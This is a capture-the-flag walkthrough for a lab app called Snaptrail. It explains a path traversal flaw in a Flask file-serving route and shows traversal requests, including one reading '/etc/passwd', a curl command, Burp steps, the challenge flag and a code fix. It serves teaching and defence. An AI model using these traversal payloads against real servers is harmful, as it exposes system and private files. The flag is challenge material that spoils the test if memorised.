# Snaptrail — Solution / Walkthrough

> ⚠️ **Spoilers ahead.** Try the challenge yourself before reading.

## The vulnerability (level 2 — forced prefix)

`app/routes.py` builds the file path like this:

```python
gallery_dir = current_app.config["GALLERY_DIR"]   # the "forced prefix"
target_path = os.path.join(gallery_dir, name)      # name comes from the user
...
return send_file(target_path, as_attachment=False)
```

The developer assumes that *always prepending* `gallery_dir` keeps every
request inside the gallery. It does not. `os.path.join` happily keeps `..`
components, so the path walks back out of the prefix. (It would also honour an
absolute `name` by discarding the prefix entirely.) There is no check that the
resolved path stays inside `gallery_dir`, so this is still a path traversal
(CWE-22) — just hidden behind a base directory that *looks* like protection.

## Exploitation

Normal, intended request:

```
GET /media?name=sunrise-bali.jpg
```

Escape the forced `photos/` prefix to read the flag one level up:

```
GET /media?name=../flag.txt
```

With `curl`:

```bash
curl --path-as-is "http://localhost:5000/media?name=../flag.txt"
```

> `--path-as-is` stops curl from normalizing `../` before sending.

Expected output:

```
FLAG{P4TH_TR4V3RS4L_L3V3L_2}
```

### Going further

Keep walking up to read files from the container filesystem:

```
GET /media?name=../../../../etc/passwd
```

(Inside the hardened container this reads the container's own `/etc/passwd`,
not your host's — which is the point of running labs in Docker.)

## Doing it in Burp Suite

1. Proxy your browser through Burp and load <http://localhost:5000>.
2. Click **Open** on any photo — capture the request in **Proxy > HTTP history**.
3. Send it to **Repeater**.
4. Change the `name` parameter to `../flag.txt` and send.
5. Observe the flag in the response.

Try **Intruder** with a path-traversal wordlist (e.g. from
[SecLists](https://github.com/danielmiessler/SecLists)) to see how a scanner
would discover this automatically.

## The fix

Prepending a base directory is not enough. Resolve the final path and verify it
stays within the allowed base before serving:

```python
import os
from flask import abort, send_file

def safe_path(base_dir: str, user_supplied: str) -> str:
    # Reject absolute paths and resolve the real, canonical path.
    full = os.path.realpath(os.path.join(base_dir, user_supplied))
    base = os.path.realpath(base_dir)
    # Ensure the resolved path is inside base_dir.
    if os.path.commonpath([full, base]) != base:
        abort(403)
    return full
```

Other defenses: serve files by an opaque ID mapped server-side (never by raw
filename), use an allow-list, or use a framework helper such as Flask's
`send_from_directory`, which performs safe-join checks for you.
